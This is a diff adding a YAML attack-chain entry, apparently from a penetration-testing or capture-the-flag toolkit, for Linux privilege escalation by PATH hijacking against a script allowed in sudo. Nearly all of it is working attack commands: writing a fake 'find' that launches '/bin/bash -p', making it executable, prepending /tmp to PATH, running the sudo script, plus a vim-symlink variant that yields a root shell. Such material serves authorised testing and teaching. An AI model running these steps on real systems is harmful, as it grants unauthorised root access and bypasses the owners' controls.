@@ -1,0 +1,49 @@
+chain_id: path_hijacking
+title: "Linux privesc — PATH hijacking against a sudo script"
+severity: CRITICAL
+tags: [linux, privesc, sudo, path, hijack]
+
+trigger:
+  any_of:
+    - { kind: "sudo-script" }
+
+description: |
+  A script (.sh / .py / .pl) appears in `sudo -l`. If it invokes any binary
+  by name only (no absolute path) — e.g. calls `find`, `tail`, `ls` — you
+  can drop a malicious binary with the same name in /tmp, prepend /tmp to
+  PATH, and have it executed as root.
+
+steps:
+  - id: 1
+    title: "Move to a writable directory"
+    command: cd /tmp
+
+  - id: 2
+    title: "Create a fake binary with the same name as the one called by the script"
+    command: echo -e '#!/bin/bash\n/bin/bash -p' > find
+    notes: |
+      Replace `find` with the actual name the script calls (`tail`, `ls`, etc.).
+
+  - id: 3
+    title: "Make it executable"
+    command: chmod +x find
+
+  - id: 4
+    title: "Prepend /tmp to PATH"
+    command: export PATH=/tmp:$PATH
+
+  - id: 5
+    title: "Trigger the vulnerable script"
+    command: sudo /ruta/al/script.sh
+
+  - id: 6
+    title: "Variant — symlink to an interactive binary like vim"
+    command: |
+      ln -s /usr/bin/vim /tmp/tail
+      export PATH=/tmp:$PATH
+      sudo /ruta/al/script.sh
+    notes: |
+      Inside vim, type :shell to drop into a root shell.
+
+references:
+  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path
